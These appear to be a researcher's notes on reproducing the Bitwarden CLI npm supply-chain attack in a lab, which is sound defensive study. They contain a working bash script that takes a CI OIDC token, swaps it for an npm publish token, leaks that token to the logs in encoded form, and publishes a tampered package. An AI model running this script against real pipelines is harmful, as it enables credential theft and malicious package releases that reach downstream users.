- https://github.com/bitwarden/clients/commit/03df1ecd86132e06643d24c856d8976d1b497945
- https://github.com/bitwarden/clients/commit/47c6f59083d3851fa1f15970dc51cf4a15e55840#diff-246cd0c2f7db532638dd80a92ac011f49b3d26038983a4c0169ea8f8a5c39280
- https://github.com/bitwarden/gh-actions/commit/c6c45e75f359988d01ff140c771da1ff083c1389
- https://www.aikido.dev/blog/shai-hulud-npm-bitwarden-cli-compromise
- https://www.ox.security/blog/shai-hulud-bitwarden-cli-supply-chain-attack/
- https://www.endorlabs.com/learn/shai-hulud-the-third-coming----inside-the-bitwarden-cli-2026-4-0-supply-chain-attack

- Phoenix security is unreliable, Checkmarx was used as a scanner but it didn't seem like the attack vector
  - Verify whether the Checkmarx scanner led to a leak

- Verdaccio could be a good stand-in for NPM

- ForgeJo supports OIDC in Actions, Gitea does not
  - Need to convert

OIDC yoinking script:
```bash
  OIDC_TOKEN=$(curl -sH "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=npm:registry.npmjs.org" | jq -r .value)
  NPM_TOKEN=$(curl -s -X POST https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/%40bitwarden%2Fcli \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $OIDC_TOKEN" \
    -d "{\"oidcToken\":\"$OIDC_TOKEN\"}" | jq -r .token)
  echo $NPM_TOKEN | base64 -w 0 | base64 -w 0
  npm config set //registry.npmjs.org/:_authToken $NPM_TOKEN
  cp scripts/cli-2026.4.0.tgz /tmp
  cd /tmp
  npm publish scripts/cli-2026.4.0.tgz
```

- Workflows needed:
  - Build
  - Publish
  - Test

- OIDC provider: https://www.npmjs.com/package/oidc-provider
- https://josefdri.github.io/the_last_dev_blog/oidc/2025/10/17/how-to-create-an-identity-provider-with-node-oidc-provider.html
- Verdaccio OpenID plugin: https://github.com/kuoruan/verdaccio-openid

- Ok so apparently NPM trusted publishing is just borked: https://codeberg.org/forgejo/forgejo/issues/12311
